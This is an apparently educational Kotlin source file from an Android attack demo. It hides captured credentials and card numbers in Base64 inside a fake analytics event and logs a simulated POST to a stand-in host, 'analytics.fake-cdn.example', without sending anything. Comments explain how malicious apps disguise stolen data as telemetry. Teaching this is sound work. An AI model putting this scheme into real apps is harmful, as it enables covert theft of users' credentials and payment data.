package com.ghosttouch.attacker.exfil

import android.util.Base64
import android.util.Log
import com.ghosttouch.attacker.capture.SessionRepository
import com.ghosttouch.common.model.CaptureSession
import com.google.gson.GsonBuilder
import com.google.gson.JsonObject
import java.util.UUID

/**
 * Simulates data exfiltration by encoding captured credentials into
 * innocent-looking payloads disguised as analytics/telemetry data.
 *
 * ## How real exfiltration works
 * Malicious apps typically don't send stolen data in plaintext. Instead, they:
 * 1. **Encode** the data (Base64, custom encryption, etc.)
 * 2. **Disguise** the payload as legitimate traffic (analytics events, crash reports)
 * 3. **Send** via HTTPS to a C2 (command & control) server
 * 4. **Blend** with normal app traffic to avoid detection
 *
 * ## What this demo does
 * - Encodes credentials in Base64
 * - Wraps them in a JSON payload that looks like an analytics event
 * - Logs the "sent" request instead of actually sending to any server
 * - Shows both encoded and decoded data in the session viewer
 *
 * This is purely educational — no actual network requests are made.
 */
object DataExfiltrator {

    private const val TAG = "DataExfiltrator"
    private val gson = GsonBuilder().setPrettyPrinting().create()

    /**
     * "Exfiltrates" a capture session by encoding it and logging the payload.
     *
     * In a real attack, this would POST the data to a remote server via HTTPS.
     * Here we only log to Logcat and update the session with the encoded payload.
     *
     * @param session The captured session to exfiltrate.
     * @return The disguised payload as a JSON string.
     */
    fun exfiltrate(session: CaptureSession): String {
        // Step 1: Build the sensitive data JSON
        val sensitiveData = JsonObject().apply {
            addProperty("u", session.email)      // "u" for user — abbreviated to look like telemetry
            addProperty("p", session.password)    // "p" for password
            addProperty("t", session.targetApp)   // "t" for target
            if (session.cardNumber.isNotEmpty()) {
                addProperty("c", session.cardNumber) // "c" for card
            }
        }

        // Step 2: Base64-encode the sensitive payload
        val sensitiveJson = gson.toJson(sensitiveData)
        val encodedPayload = Base64.encodeToString(
            sensitiveJson.toByteArray(Charsets.UTF_8),
            Base64.NO_WRAP
        )

        // Step 3: Wrap in an innocent-looking analytics event
        val disguisedPayload = JsonObject().apply {
            addProperty("event", "app_session_metric")
            addProperty("client_id", UUID.randomUUID().toString().take(8))
            addProperty("payload", encodedPayload)  // The stolen data, hidden in plain sight
            addProperty("ts", System.currentTimeMillis() / 1000)
            addProperty("version", "2.1.0")
            addProperty("platform", "android")
            addProperty("sdk_ver", "4.8.2")
        }

        val payloadString = gson.toJson(disguisedPayload)

        // Step 4: Log what would be sent (no actual network request)
        Log.d(TAG, "═══════════════════════════════════════════")
        Log.d(TAG, "SIMULATED EXFILTRATION — NOT ACTUALLY SENT")
        Log.d(TAG, "═══════════════════════════════════════════")
        Log.d(TAG, "Target URL: https://analytics.fake-cdn.example/v2/collect")
        Log.d(TAG, "Method: POST")
        Log.d(TAG, "Content-Type: application/json")
        Log.d(TAG, "Disguised payload (looks like analytics):")
        Log.d(TAG, payloadString)
        Log.d(TAG, "───────────────────────────────────────────")
        Log.d(TAG, "Decoded payload (actual stolen data):")
        Log.d(TAG, sensitiveJson)
        Log.d(TAG, "═══════════════════════════════════════════")

        // Step 5: Update session repository with exfil results
        SessionRepository.updateExfilStatus(
            sessionId = session.id,
            encodedPayload = payloadString,
            status = "sent (simulated)"
        )

        return payloadString
    }

    /**
     * Decodes a Base64-encoded payload for display in the session viewer.
     * Used to show the demo audience what's hidden inside the analytics event.
     *
     * @param encodedPayload The full disguised JSON payload.
     * @return The decoded sensitive data, or an error message.
     */
    fun decodePayload(encodedPayload: String): String {
        return try {
            val json = gson.fromJson(encodedPayload, JsonObject::class.java)
            val base64Data = json.get("payload")?.asString ?: return "No payload field"
            val decoded = Base64.decode(base64Data, Base64.NO_WRAP)
            String(decoded, Charsets.UTF_8)
        } catch (e: Exception) {
            "Decode error: ${e.message}"
        }
    }
}
